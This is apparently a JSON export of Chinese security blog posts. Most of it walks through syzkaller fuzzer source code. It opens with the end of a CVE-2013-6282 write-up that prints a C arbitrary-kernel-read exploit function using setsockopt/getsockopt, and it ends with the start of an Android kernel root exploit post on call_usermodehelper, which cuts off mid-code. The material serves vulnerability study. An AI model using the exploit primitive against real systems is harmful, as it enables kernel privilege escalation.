SOL_IP\t\t0\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/socket.h#L299\n#define SOL_TIPC\t271\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/in.h#L30\nIPPROTO_TCP = 6\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/in.h#L30\n#define IP_TTL\t\t2\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L202\n#define TIPC_IMPORTANCE\t\t127\t/* Default: TIPC_LOW_IMPORTANCE */\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L203\n#define TIPC_SRC_DROPPABLE\t128\t/* Default: based on socket type */\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L204\n#define TIPC_DEST_DROPPABLE\t129\t/* Default: based on socket type */\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L205\n#define TIPC_CONN_TIMEOUT\t130\t/* Default: 8000 (ms)  */\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L206\n#define TIPC_NODE_RECVQ_DEPTH\t131\t/* Default: none (read only) */\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/tipc.h#L207\n#define TIPC_SOCK_RECVQ_DEPTH\t132\t/* Default: none (read only) */\n```\n\n#### [任意地址读exp](https://github.com/fi01/libget_user_exploit/blob/master/get_user.c)\n\n```go\nstatic bool ipsock_read_value_at_address(unsigned long address, int *value)\n{\n  unsigned int addr;\n  unsigned char *data = (void *)value;\n  int sock;\n  int i;\n\n  *value = 0;\n  errno = 0;\n\n  //建立套接字\n  if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {\n    printf(\"error in socket().\\n\");\n    return false;\n  }\n\n  for (i = 0; i < sizeof (*value); i++, address++, data++) {\n  \t//布置合理的lv绕过check,通过get_user读取address地址的内容实现任意地址读\n  \t//返回0读取成功\n    if (setsockopt(sock, SOL_IP, IP_TTL, (void *)address, 1) != 0) {\n        //get_user返回-EFAULT 失败\n    \tif (errno != EINVAL) {\n      \t    printf(\"error in setsockopt().\\n\");\n\t\t    *value = 0;\n\t\t    return false;\n      }\n    }\n    else {//get_user返回0 说明get_user成功执行\n      socklen_t optlen = 1;\n      if (getsockopt(sock, SOL_IP, IP_TTL, data, &optlen) != 0) {\n      \tprintf(\"error in getsockopt().\\n\");\n\t\t*value = 0;\n\t\treturn false;\n      }\n    }\n  }\n  close(sock);\n  return true;\n}\n```\n\n\n### Reference\n\n[https://github.com/timwr/CVE-2013-6282/blob/master/exploit.c](https://github.com/timwr/CVE-2013-6282/blob/master/exploit.c)\n[https://github.com/fi01/libput_user_exploit/blob/master/put_user.c](https://github.com/fi01/libput_user_exploit/blob/master/put_user.c)\n[https://github.com/fi01/libget_user_exploit/blob/master/get_user.c](https://github.com/fi01/libget_user_exploit/blob/master/get_user.c)\n[https://github.com/fi01/libget_user_exploit/blob/master/get_user.c](https://github.com/fi01/libget_user_exploit/blob/master/get_user.c)\n[https://github.com/erik96/Linux-Kernel-3.4/blob/linux-stable2/net/tipc/socket.c](https://github.com/erik96/Linux-Kernel-3.4/blob/linux-stable2/net/tipc/socket.c)\n[https://github.com/erik96/Linux-Kernel-3.4/](https://github.com/erik96/Linux-Kernel-3.4/)\n","tags":["cve-2013-6282"],"categories":["kernel"]},{"title":"syzkaller_source_read_target_type_and_function","url":"/posts/uncategorized/2018-05-02-syzkaller_source_read_target_type_and_function.html","content":"\n# ** 本文摘要—— {{ title }} ** <Excerpt in index | 首页:摘要>\n<!-- more -->\n\n<The rest of contents | 余下全文>\n\n## syzkaller源码阅读之Target类型以及相关的函数\n\n\n### Target类型\n\nTarget类型是用来描述fuzz目标系统的相关信息,包含系统调用切片\nprog/target.go中定义\n\n```go\ntype Target struct {\n\tOS         string                               //操作系统名字\n\tArch       string                               //体系结构名\n\tRevision   string                               //对描述做hash 唯一化\n\tPtrSize    uint64                               //目标系统指针大小\n\tPageSize   uint64                               //目标系统页大小\n\tNumPages   uint64                               //目标中页数目\n\tDataOffset uint64                               //DataOffset\n\n\tSyscalls  []*Syscall                            //目标的系统调用描述切片数组 Syscall类型\n\tResources []*ResourceDesc\n\tStructs   []*KeyedStruct\n\tConsts    []ConstValue\n\n\t// MakeMmap用来创建一段内存范围  [addr, addr+size)\n\tMakeMmap func(addr, size uint64) *Call\n\n\tSanitizeCall func(c *Call)\n\n\t// SpecialTypes是用来进行变异的 键是要编译的结构体/联合 值是变异的函数\n\tSpecialTypes map[string]func(g *Gen, typ Type, old Arg) (Arg, []*Call)\n\n\t// 对目标有特殊影响的字符串\n\tStringDictionary []string\n\n\tinit        sync.Once\t\t\t\t\t\t\t\t\t//init sync.Once保证唯一性、只运行一次\n\tinitArch    func(target *Target)\t\t\t\t\t\t//初始化体系结构\n\tSyscallMap  map[string]*Syscall\n\tConstMap    map[string]uint64\n\tresourceMap map[string]*ResourceDesc\n\tresourceCtors map[string][]*Syscall\n\tany           anyTypes\n}\n```\n\n#### Target类型几个重要的参数\n\n\n##### 注册一个新的Target类型\n当manager启动时候保存有一个targets的全局变量(map类型,键是:\"OS/Arch\"——特定的操作系统和体系结构,如OS:\"linux\", Arch: \"amd64\",值是:对应的Target类型)\n注册一个新的Target类型\nprog/target.go中定义\n\n```go\n\nvar targets = make(map[string]*Target)\n\nfunc RegisterTarget(target *Target, initArch func(target *Target)) {\n\t//键\n\tkey := target.OS + \"/\" + target.Arch\n\tif targets[key] != nil {\n\t\tpanic(fmt.Sprintf(\"duplicate target %v\", key))\n\t}\n\ttarget.initArch = initArch\n\t//注册到全局变量中\n\ttargets[key] = target\n}\n```\n\n在syzkaller/sys/目录下包含了所支持的所有Target类型,比如linux系统下的amd64体系结构,在syzkaller/sys/linux/amd64.go中定义了Target类型所需要的各种参数如系统调用、分页大小、指针大小等信息\n\n```go\nfunc init() {\n        RegisterTarget(&Target{OS: \"linux\", Arch: \"amd64\", Revision: revision_amd64, PtrSize: 8, PageSize: 4096, NumPages: 4096, DataOffset: 536870912, Syscalls: syscalls_amd64, Resources: resources_amd64, Structs: structDescs_amd64, Consts: consts_amd64}, initTarget)\n}\n\n```\n\n```go\n\n```\n\n##### 从全局变量targets中获取一个具体的Target\n\n通过OS、arch得到key,然后返回对应具体的Target类型\nprog/target.go中定义\n\n```go\nfunc GetTarget(OS, arch string) (*Target, error) {\n\t//通过os、arch拼接得到键\n\tkey := OS + \"/\" + arch\n\t//从全局变量中获取target类型对象\n\ttarget := targets[key]\n\t//target类型对象不存在 不支持的target类型\n\tif target == nil {\n\t\tvar supported []string\n\t\tfor _, t := range targets {\n\t\t\tsupported = append(supported, fmt.Sprintf(\"%v/%v\", t.OS, t.Arch))\n\t\t}\n\t\tsort.Strings(supported)\n\t\treturn nil, fmt.Errorf(\"unknown target: %v (supported: %v)\", key, supported)\n\t}\n\t//加锁调用lazyInit 进行相关初始化\n\ttarget.init.Do(target.lazyInit)\n\treturn target, nil\n}\n```\n\n##### 初始化Target中的Consts、系统调用和Resources等\n\n初始化Target类型中相关的系统调用资源等\nprog/target.go中定义\n\n\n```go\n//初始化initTarget、initArch、ConstMap等\nfunc (target *Target) lazyInit() {\n\ttarget.SanitizeCall = func(c *Call) {}\n\ttarget.initTarget()\n\ttarget.initArch(target)\n\ttarget.ConstMap = nil // currently used only by initArch\n}\n```\n\n##### 初始化相关系统调用、资源的核心函数\n\n初始化相关的资源和系统调用、对应目标系统支持的页大小、指针大小等信息\nprog/target.go中定义\n其中不同的Target类型在syzkaller/sys下定义,如linux系统amd64体系结构在syzkaller/sys/linux/amd64.go下,包含了对应的资源、系统调用相关信息\n\n```go\nfunc (target *Target) initTarget() {\n\ttarget.ConstMap = make(map[string]uint64)\n\tfor _, c := range target.Consts {\n\t\ttarget.ConstMap[c.Name] = c.Value\n\t}\n\n    //初始化对应的资源(syzkaller/sys/中定义了和目标系统体系结构相关的资源)\n\ttarget.resourceMap = make(map[string]*ResourceDesc)\n\tfor _, res := range target.Resources {\n\t\ttarget.resourceMap[res.Name] = res\n\t}\n\n\tkeyedStructs := make(map[StructKey]*StructDesc)\n\tfor _, desc := range target.Structs {\n\t\tkeyedStructs[desc.Key] = desc.Desc\n\t}\n\ttarget.Structs = nil\n\n    //初始化系统调用(syzkaller/sys/中定义了和目标系统体系结构相关的系统调用)\n\ttarget.SyscallMap = make(map[string]*Syscall)\n\tfor i, c := range target.Syscalls {\n\t\tc.ID = i\n\t\ttarget.SyscallMap[c.Name] = c\n\t\tForeachType(c, func(t0 Type) {\n\t\t\tswitch t := t0.(type) {\n\t\t\tcase *ResourceType:\n\t\t\t\tt.Desc = target.resourceMap[t.TypeName]\n\t\t\t\tif t.Desc == nil {\n\t\t\t\t\tpanic(\"no resource desc\")\n\t\t\t\t}\n\t\t\tcase *StructType:\n\t\t\t\tt.StructDesc = keyedStructs[t.Key]\n\t\t\t\tif t.StructDesc == nil {\n\t\t\t\t\tpanic(\"no struct desc\")\n\t\t\t\t}\n\t\t\tcase *UnionType:\n\t\t\t\tt.StructDesc = keyedStructs[t.Key]\n\t\t\t\tif t.StructDesc == nil {\n\t\t\t\t\tpanic(\"no union desc\")\n\t\t\t\t}\n\t\t\t}\n\t\t})\n\t}\n\n\ttarget.resourceCtors = make(map[string][]*Syscall)\n\tfor _, res := range target.Resources {\n\t\ttarget.resourceCtors[res.Name] = target.calcResourceCtors(res.Kind, false)\n\t}\n\tinitAnyTypes(target)\n}\n```\n\nsyzkaller/sys/linux/amd64.go中定义的系统调用和资源相关的demo\n\n```go\n系统调用相关的定义:\nvar syscalls_amd64 = []*Syscall{\n        {NR: 43, Name: \"accept\", CallName: \"accept\", Args: []Type{\n                &ResourceType{TypeCommon: TypeCommon{TypeName: \"sock\", FldName: \"fd\", TypeSize: 4}},\n                &PtrType{TypeCommon: TypeCommon{TypeName: \"ptr\", FldName: \"peer\", TypeSize: 8, IsOptional: true}, Type: &UnionType{Key: StructKey{Name: \"sockaddr_storage\", Dir: 1}}},\n...\n...\n\n\n资源相关的定义:\n\tvar resources_amd64 = []*ResourceDesc{\n            {Name: \"assoc_id\", Type: &IntType{IntTypeCommon: IntTypeCommon{TypeCommon: TypeCommon{TypeName: \"int32\", TypeSize: 4}}}, Kind: []string{\"assoc_id\"}, Values: []uint64{0}},\n            \n...\n...\n\n```\n\n\n\n\n### Prog类型\n\nProg类型是一个很关键的类型,一个fuzzer(executor——Linux下是executor_linux,在syzkaller/syz-fuzzer目录下定义)执行中保留有一个Prog类型。\nProg类型包含了Target类型——目标系统相关的信息以及Call切片数组,这里该Call数组是生成的一组系统调用或者是经过变异后的一组系统调用,用于fuzzer去执行该系统调用数组,然后检测是否出现crash或者hangup等信号。\n我们知道Call实际上就是一个系统调用完整的包装(包含参数类型、参数值和返回值等信息)\nprog/prog.go中定义\n\n```go\ntype Prog struct {\n\tTarget *Target                      //目标系统信息的描述\n\tCalls  []*Call                      //包含一组生成或者变异的系统调用,用于进行实际的fuzz\n}\n```\n\n\n#### Prog类型几个重要的函数\n\n##### 插入一个系统调用\n\n向Prog中的系统调用切片数组中添加一个新的系统调用,插入到指定的系统调用之前,该系统调用可能是生成的也可能是变异得来的\n通过参数找到要插入新的系统调用的位置,然后插入新的系统调用\nprog/prog.go中定义\n\n```go\nfunc (p *Prog) insertBefore(c *Call, calls []*Call) {\n\tidx := 0//c在系统调用切片数组中的位置\n\t//查找到系统调用c在当前的prog中系统调用切片数组中的位置\n\tfor ; idx < len(p.Calls); idx++ {\n\t\tif p.Calls[idx] == c {\n\t\t\tbreak\n\t\t}\n\t}\n\tvar newCalls []*Call\n\t//插入前 .... p.Calls[:idx] c p.Calls[idx+1] ....\n\t//插入后 .... p.Calls[:idx] calls c p.Calls[idx+1]....\n\tnewCalls = append(newCalls, p.Calls[:idx]...)\n\tnewCalls = append(newCalls, calls...)\n\tif idx < len(p.Calls) {\n\t\tnewCalls = append(newCalls, p.Calls[idx])\n\t\tnewCalls = append(newCalls, p.Calls[idx+1:]...)\n\t}\n\t//更新当前prog的系统调用为newCalls\n\tp.Calls = newCalls\n}\n```\n\n##### 删除一个系统调用\n\n通过传递数组下标,从Prog类型中的系统调用切片数组中删除对应的系统调用\nprog/prog.go中定义\n\n```go\nfunc (p *Prog) removeCall(idx int) {\n\tc := p.Calls[idx]\n\t//获取idx对应的系统调用\n\t//遍历idx系统调用的参数并删除\n\tfor _, arg := range c.Args {\n\t\tremoveArg(arg)\n\t}\n\t//删除系统调用的返回值\n\tremoveArg(c.Ret)\n\t//删除系统调用\n\t//把切片p.Calls[idx+1:]拷贝到p.Calls[idx]位置开始\n\tcopy(p.Calls[idx:], p.Calls[idx+1:])//删除系统调用p.Calls[idx]\n\tp.Calls = p.Calls[:len(p.Calls)-1]\n}\n```\n\n\n### 总结\n\n这里只是简单的总结了下Target类型、Prog类型和几个比较重要的函数,Target和Prog类型还包含别的函数以及和fuzz相关的函数,将会在后面进行更详细的介绍\n","tags":["fuzzer"]},{"title":"syzkaller_source_read_syscall_type_and_function","url":"/posts/uncategorized/2018-05-02-syzkaller_source_read_syscall_type_and_function.html","content":"\n# ** 本文摘要—— {{ title }} ** <Excerpt in index | 首页:摘要>\n<!-- more -->\n\n<The rest of contents | 余下全文>\n\n\n## syzkaller源码阅读之系统调用相关的类型和函数\n\n\n### 系统调用相关的类型\n\n系统调用描述类型Syscall定义:包含系统调用号NR、系统调用参数类型和返回值类型等\n在prog/types.go中定义\n\n```go\ntype Syscall struct {\n\tID       int            //ID也是系统调用号\n\tNR       uint64         //系统调用号\n\tName     string         //名字\n\tCallName string         //函数调用名\n\tArgs     []Type         //系统调用参数类型切片数组\n\tRet      Type           //系统调用返回值类型\n}\n```\n\n完整的系统调用类型:Syscall中只包含了系统调用参数的类型和返回值类型\nprog/prog.go中定义\n\n```go\ntype Call struct {\n\tMeta *Syscall\n\tArgs []Arg              //系统调用参数值切片数组\n\tRet  Arg                //系统调用返回值\n}\n```\n\n### 系统调用的参数\n\n#### 系统调用参数模式\n\n系统调用参数模式分为:输入参数、输出参数、即是输入也是输出参数\n在prog/types.go中定义\n\n```go\ntype Dir int\n\n//定义参数模式\nconst (\n\tDirIn Dir = iota         //0 输入参数\n\tDirOut                  //1 输出参数\n\tDirInOut               //2 即是输入参数也是输出参数\n)\n```\n\n以字符串形式返回系统调用参数模式:输入参数——in、输出参数——out、即是输入参数也是输出参数——inout\n在prog/types.go中定义\n\n```go\nfunc (dir Dir) String() string {\n\tswitch dir {\n\tcase DirIn:\n\t\treturn \"in\"\n\tcase DirOut:\n\t\treturn \"out\"\n\tcase DirInOut:\n\t\treturn \"inout\"\n\tdefault:\n\t\tpanic(\"unknown dir\")\n\t}\n}\n```\n\n\n#### 系统调用参数类型接口\n\n##### 系统调用参数接口\n\n参数类型接口需要实现两个方法:返回参数的类型——Type()和参数的大小——Size()\nprog/prog.go中定义\n\n```go\ntype Arg interface {\n\tType() Type             //返回参数的类型\n\tSize() uint64           //返回参数的大小\n}\n```\n\n##### 系统调用参数类型接口\n\n参数类型接口需要实现如下几个方法:\nprog/types.go中定义\n\n```go\ntype Type interface {\n\tString() string\n\tName() string\n\tFieldName() string\n\tDir() Dir\n\tOptional() bool\n\tDefault() uint64\n\tVarlen() bool\n\tSize() uint64\n\tBitfieldOffset() uint64\n\tBitfieldLength() uint64\n\tBitfieldMiddle() bool\n}\n```\n\n##### 通用参数类型类型\n\n定义通用参数类型:只包含一个成员变量,参数接口类型Type\nprog/prog.go中定义\n\n```go\ntype ArgCommon struct {\n\ttyp Type\n}\n```\n\n实现参数接口的Type方法\nprog/prog.go中定义\n\n```go\nfunc (arg *ArgCommon) Type() Type {\n\treturn arg.typ\n}\n```\n\n\n### 具体的参数类型\n\n具体参数类型可以分为一下几个:Const类型参数、指针类型和vma类型的参数、Data类型的参数、Group类型的参数(结构体和数组)、Union类型的参数(联合共用体类型)和Resource类型的参数\n每一参数类型都包含一个成员变量——通用的参数类型ArgCommon\n\n\n#### Const类型的参数\n\nConst类型的参数包括下面几个:ConstType,IntType,FlagsType,LenType,ProcType,CsumType和ResourceType\n\n定义Const类型的参数:Const类型包含Const类型——常量、IntType——int类型、FlagsType——在系统调用中用来表示Flags、LenType——长度、Resource——资源类型、ProcType和CsumType\nprog/prog.go中定义\n\n```go\ntype ConstArg struct {\n\tArgCommon               //通用参数类型\n\tVal uint64              //参数的值\n}\n```\n\n实现Const类型参数的Size()接口方法\nprog/prog.go中定义\n\n```go\nfunc (arg *ConstArg) Size() uint64 {\n\treturn arg.typ.Size()\n}\n```\n\n实现Const类型的参数返回其值:判断Const类型参数具体是哪一个，并返回其值——第一个是值、第二个是和处理器proc相关、第三个是否为大端模式\nprog/prog.go中实现\n\n```go\nfunc (arg *ConstArg) Value() (uint64, uint64, bool) {\n\t//判断Const参数类型\n\tswitch typ := (*arg).Type().(type) {\n\t//int类型\n\tcase *IntType:\n\t\treturn arg.Val, 0, typ.BigEndian\n\t//const类型\t\n\tcase *ConstType:\n\t\treturn arg.Val, 0, typ.BigEndian\n\t//flags类型\t\n\tcase *FlagsType:\n\t\treturn arg.Val, 0, typ.BigEndian\n\t//len类型\t\n\tcase *LenType:\n\t\treturn arg.Val, 0, typ.BigEndian\n\t//csum类型\t\n\tcase *CsumType:\n\t\treturn 0, 0, false\n\t//Resource资源类型\t\n\tcase *ResourceType:\n\t\tt := typ.Desc.Type.(*IntType)\n\t\treturn arg.Val, 0, t.BigEndian\n\t//Proc类型\t\n\tcase *ProcType:\n\t\tif arg.Val == typ.Default() {\n\t\t\treturn 0, 0, false\n\t\t}\n\t\treturn typ.ValuesStart + arg.Val, typ.ValuesPerProc, typ.BigEndian\n\tdefault:\n\t\tpanic(fmt.Sprintf(\"unknown ConstArg type %#v\", typ))\n\t}\n}\n```\n\n\n\n#### 指针类型和vma类型的参数\n\n定义指针类型的参数\nprog/prog.go中定义\n\n```go\ntype PointerArg struct {\n\tArgCommon\n\tAddress uint64              //指针地址\n\tVmaSize uint64              //vma大小\n\tRes     Arg                 //指针指向的对象\n}\n```\n\n判断指针是否为空:指针地址是否为空、vma大小是否为空、指针指向的对象是否为nil\nprog/prog.go中定义\n\n```go\nfunc (arg *PointerArg) IsNull() bool {\n\treturn arg.Address == 0 && arg.VmaSize == 0 && arg.Res == nil\n}\n```\n\n实现参数接口Size()——返回参数大小\nprog/prog.go中定义\n\n```go\nfunc (arg *PointerArg) Size() uint64 {\n\treturn arg.typ.Size()\n}\n```\n\n#### Data类型的参数\n\n定义Data类型的参数\nprog/prog.go中定义\n\n```go\ntype DataArg struct {\n\tArgCommon\n\tdata []byte                //切片数组用来保存输入in/输入输出inout参数\n\tsize uint64                //data大小\n}\n```\n\n实现Data参数类型的Size()接口方法——返回参数大小\nprog/prog.go中定义\n\n```go\nfunc (arg *DataArg) Size() uint64 {\n\tif len(arg.data) != 0 {\n\t\treturn uint64(len(arg.data))\n\t}\n\treturn arg.size\n}\n```\n\n实现Data参数类型的Data()方法——返回参数数据信息(只能是输入参数模式或者输入输出模式的参数)\nprog/prog.go中定义\n\n```go\nfunc (arg *DataArg) Data() []byte {\n\t//判断参数是否是输出参数\n\tif arg.Type().Dir() == DirOut {\n\t\tpanic(\"getting data of output data arg\")\n\t}\n\treturn arg.data\n}\n```\n\n\n#### Group类型的参数\n\nGroup类型的参数包括两类:结构体类型——StructType和数组类型——ArrayType\n当Group类型是结构体类型时,Inner用来表示结构体中的成员\n当Group类型是数组类型时,Inner来表示数组元素\n实际上可以把结构体类型当成数组类型只是每个数组元素是不同的参数类型也相当于一个切片数组\nprog/prog.go中定义\n\n```go\ntype GroupArg struct {\n\tArgCommon\n\tInner []Arg             //切片数组:结构体成员或者数组元素\n}\n```\n\n实现Group参数类型的Size()方法——返回Group类型的大小\n对于结构体类型参数,需要循环遍历结构体的每个成员依次获取相应成员的大小然后计算出结构体大小总和\n对于数组类型参数,需要循环遍历数组元素,统计总的数组元素的大小之和\nprog/prog.go中定义\n\n```go\nfunc (arg *GroupArg) Size() uint64 {\n\ttyp0 := arg.Type()\n\tif !typ0.Varlen() {\n\t\treturn typ0.Size()\n\t}\n\t//判断参数类型\n\tswitch typ := typ0.(type) {\n\t//结构体类型\n\tcase *StructType:\n\t\tvar size uint64\n\t\t//循环遍历结构体的每一个成员\n\t\tfor _, fld := range arg.Inner {\n\t\t\tif !fld.Type().BitfieldMiddle() {\n\t\t\t\t//求和\n\t\t\t\tsize += fld.Size()\n\t\t\t}\n\t\t}\n\t\tif typ.AlignAttr != 0 && size%typ.AlignAttr != 0 {\n\t\t\t//求和\n\t\t\tsize += typ.AlignAttr - size%typ.AlignAttr\n\t\t}\n\t\t//返回该结构体类型的大小\n\t\treturn size\n\t//数组类型\t\n\tcase *ArrayType:\n\t\tvar size uint64\n\t\t//循环遍历数组元素\n\t\tfor _, elem := range arg.Inner {\n\t\t\t//计算数组总的大小——求和\n\t\t\tsize += elem.Size()\n\t\t}\n\t\t//返回数组类型的大小\n\t\treturn size\n\tdefault:\n\t\tpanic(fmt.Sprintf(\"bad group arg type %v\", typ))\n\t}\n}\n```\n\n\n#### Union类型的参数\n\nUnion类型的参数定义:共用体、联合类型\nprog/prog.go中定义\n\n```go\ntype UnionArg struct {\n\tArgCommon\n\tOption Arg          //共用体类型实际参数类型\n}\n```\n\nUnion类型参数实现Size()——返回参数大小(返回当前共用体类型参数的大小)\n\n```go\nfunc (arg *UnionArg) Size() uint64 {\n\tif !arg.Type().Varlen() {\n\t\treturn arg.Type().Size()\n\t}\n\t//返回当前共用体参数类型的大小\n\treturn arg.Option.Size()\n}\n```\n\n\n#### Resource类型的参数\n\n##### ResultArg类型的参数\n\n资源类型的参数:kernel中Resource要么是一个常量值,要么是引用另外的一个Resource,或者是通过别的调用返回的值\n资源类型的参数需要模拟引用,当资源类型的参数是某个系统调用返回时是ResultArg类型的参数,当资源类型的参数被别的资源类参数引用时,需要引用+1,资源类型的参数封装了一个map(键:参数,值:bool)用来表示资源类型的参数是否被使用\nprog/prog.go中定义\n\n```go\ntype ResultArg struct {\n\tArgCommon\n\tRes   Arg                       //当Resource类型的参数是引用另外的Resource时,Res代表引用的Resource参数\n\tOpDiv uint64                    //-1\n\tOpAdd uint64                    //+1\n\tVal   uint64                    //Res引用计数\n\tuses  map[Arg]bool             //map,用来表示资源是否被ArgResult参数使用\n}\n```\n\n实现资源类型参数接口Size()——返回资源类型参数大小\nprog/prog.go中定义\n\n```go\nfunc (arg *ResultArg) Size() uint64 {\n\treturn arg.typ.Size()\n}\n```\n\n实现资源类型参数的Used()方法——返回map,便于查看使用该资源的参数\nprog/prog.go中定义\n\n```go\nfunc (arg *ResultArg) Used() *map[Arg]bool {\n\treturn &arg.uses\n}\n```\n\n实现资源类型的的Uses()方法——此时的资源参数是引用别的资源参数,返回引用的资源参数\nprog/prog.go中定义\n\n```go\nfunc (arg *ResultArg) Uses() *Arg {\n\treturn &arg.Res\n}\n```\n\n\n##### ReturnArg类型参数\n\nReturnArg类型参数是系统调用的返回值,包含:ResourceType类型的参数和VmaType类型的参数\nprog/prog.go中定义\n\n```go\ntype ReturnArg struct {\n\tArgCommon\n\tuses map[Arg]bool               //map,用来表示资源是否被ArgResult参数使用\n}\n```\n\n实现ReturnArg类型参数接口Size()——返回资源类型参数大小\nprog/prog.go中定义\n\n```go\nfunc (arg *ReturnArg) Size() uint64 {\n\tpanic(\"not called\")\n}\n```\n\n实现资源类型参数的Used()方法——返回map,便于查看使用该资源的参数\nprog/prog.go中定义\n\n```go\nfunc (arg *ReturnArg) Used() *map[Arg]bool {\n\treturn &arg.uses\n}\n```\n\n\n\n### 系统调用总结\n\n描述一个系统调用需要包含系统调用号、系统调用名以及系统调用使用的参数个数、每个参数的类型和参数的值，最后还有系统调用的返回值类型和返回值等。\n这里把系统调用封装在Call类型中,包含了系统调用描述Syscall(包含系统调用名称、系统调用号、系统调用参数类型的切片数组和系统调用返回值类型等信息)、系统调用参数切片数组(用来获取系统调用参数的值和大小等)、系统调用返回值(值和大小),这样一个完整的系统调用便成型了,包含了一个系统调用所有的信息。\n而参数最重要的是参数个数,每一个参数类型,参数的值,所以对于不同参数类型进行了相应的定义和实现,如Const类型的参数、结构体类型的参数和数组参数、资源参数等。\n","tags":["fuzzer"]},{"title":"syzkaller_source_read_rand_type_and_function","url":"/posts/uncategorized/2018-05-02-syzkaller_source_read_rand_type_and_function.html","content":"\n# ** 本文摘要—— {{ title }} ** <Excerpt in index | 首页:摘要>\n<!-- more -->\n\n<The rest of contents | 余下全文>\n\n## syzkaller源码阅读之随机数类型以及相关的函数\n\n\n### 随机数类型\n\n随机数类型randGen:封装golang标准库math/rand中的Rand,用来后续生成随机数,randGen还包含了和目标系统相关的描述Target类型\n相关的类型和函数实现在prog/rand.go文件中实现\n\n```go\ntype randGen struct {\n\t*rand.Rand\n\ttarget           *Target\n\tinCreateResource bool\n\trecDepth         map[string]int\n}\n\n```\n\n### fuzz中和生成、变异相关的函数\n\n1、通过标准库中的Intn函数生成[0,n)范围内的随机数\nprog/rand.go文件中实现\n\n```go\nfunc (r *randGen) rand(n int) uint64 {\n\treturn uint64(r.Intn(n))\n}\n```\n\n2、生成[begin,end)范围内的随机数\nprog/rand.go文件中实现\n\n```go\nfunc (r *randGen) randRange(begin, end uint64) uint64 {\n\treturn begin + uint64(r.Intn(int(end-begin+1)))\n}\n```\n\n3、生成[0,2)范围内的随机数并判断是否为0,即50%的概率返回true\nprog/rand.go文件中实现\n\n```go\nfunc (r *randGen) bin() bool {\n\treturn r.Intn(2) == 0\n}\n```\n\n4、生成[0,n)范围内的随机数并判断是否为0,即1/n的概率返回true\nprog/rand.go文件中实现\n\n```go\nfunc (r *randGen) oneOf(n int) bool {\n\treturn r.Intn(n) == 0\n}\n```\n\n5、有偏随机数,更有偏向的生成随机数,生成的随机数的概率不等\nprog/rand.go文件中实现\n\n```go\nfunc (r *randGen) biasedRand(n, k int) int {\n\tnf, kf := float64(n), float64(k)\n\trf := nf * (kf/2 + 1) * r.Float64()\n\tbf := (-1 + math.Sqrt(1+2*kf*rf/nf)) * nf / kf\n\treturn int(bf)\n}\n```\n\n6、返回[0,outOf)范围内的随机数并判断生成的随机数是否小于n,即返回true的概率是n/outOf\nprog/rand.go文件中实现\n\n```go\nfunc (r *randGen) nOutOf(n, outOf int) bool {\n\tif n <= 0 || n >= outOf {\n\t\tpanic(\"bad probability\")\n\t}\n\tv := r.Intn(outOf)\n\treturn v < n\n}\n```\n\n\n### 随机类型操作Target类型实现变异和生成,从而进行fuzz\n\n由于随机类型中包含了Target类型,Target类型中包含了相关目标系统体系结构和系统调用、资源等信息,\n这里通过随机数类型randGen可以对Target中的系统调用进行操作,比如生成和变异——fuzz中常见的两种方式\n","tags":["fuzzer"]},{"title":"new_reliable_android_kernel_root_exploit","url":"/posts/uncategorized/2018-05-02-new_reliable_android_kernel_root_exploit.html","content":"\n# ** 本文摘要—— {{ title }} ** <Excerpt in index | 首页摘要>\n<!-- more -->\n\n<The rest of contents | 余下全文>\n\n## new eliable android kernel root exploit\n\n### call_usermodehelper api简介\n\ncall_usermodehelper api可以在内核空间调用用户空间的应用程序,执行用户空间的命令\n\n#### call_usermodehelper三种模式\n\ncall_usermodehelper三种调用用户空间程序的模式\n1、UMH_NO_WAIT 不等待\n2、UMH_WAIT_EXEC 等待程序启动\n3、UMH_WAIT_PROC 等待程序结束\n\n#### call_usermodehelper api调用分析\n\ncall_usermodehelper实际上是调用call_usermodehelper_fns,分为后面几个步骤\n\n```c\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/kmod.h#L106\nstatic inline int\ncall_usermodehelper(char *path, char **argv, char **envp, enum umh_wait wait)\n{\n\treturn call_usermodehelper_fns(path, argv, envp, wait,\n\t\t\t\t       NULL, NULL, NULL);\n}\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/kmod.h#L86\n\nstatic inline int\ncall_usermodehelper_fns(char *path, char **argv, char **envp,\n\t\t\tenum umh_wait wait,\n\t\t\tint (*init)(struct subprocess_info *info),\n\t\t\tvoid (*cleanup)(struct subprocess_info *), void *data)\n{\n\tstruct subprocess_info *info;\n\tgfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;\n\n\tinfo = call_usermodehelper_setup(path, argv, envp, gfp_mask);\n\n\tif (info == NULL)\n\t\treturn -ENOMEM;\n\n\tcall_usermodehelper_setfns(info, init, cleanup, data);\n\n\treturn call_usermodehelper_exec(info, wait);\n}\n\n```\n\n##### 1、call_usermodehelper_setup设置要执行的用户空间的程序、环境变量、handler(包含初始化函数init和清理函数cleanup)等信息,相关信息填充到subprocess_info结构体中,其中__call_usermodehelper为添加到内核队列中的handler\n   \n```go\nhttps://elixir.bootlin.com/linux/v2.6.35/source/kernel/kmod.c#L331\n\nstruct subprocess_info *call_usermodehelper_setup(char *path, char **argv,\n\t\t\t\t\t\t  char **envp, gfp_t gfp_mask)\n{\n\tstruct subprocess_info *sub_info;\n\t//创建subprocess_info\n\tsub_info = kzalloc(sizeof(struct subprocess_info), gfp_mask);\n\tif (!sub_info)\n\t\tgoto out;\n\n    //设置subprocess_info\n    //设置sub_info->work ===> __call_usermodehelper\n\tINIT_WORK(&sub_info->work, __call_usermodehelper);\n\tsub_info->path = path;//用户空间执行的应用程序路径\n\tsub_info->argv = argv;//应用程序参数\n\tsub_info->envp = envp;//应用程序环境变量\n  out:\n\treturn sub_info;\n}\n\nhttps://elixir.bootlin.com/linux/v2.6.35/source/kernel/kmod.c#L364\n\nvoid call_usermodehelper_setfns(struct subprocess_info *info,\n\t\t    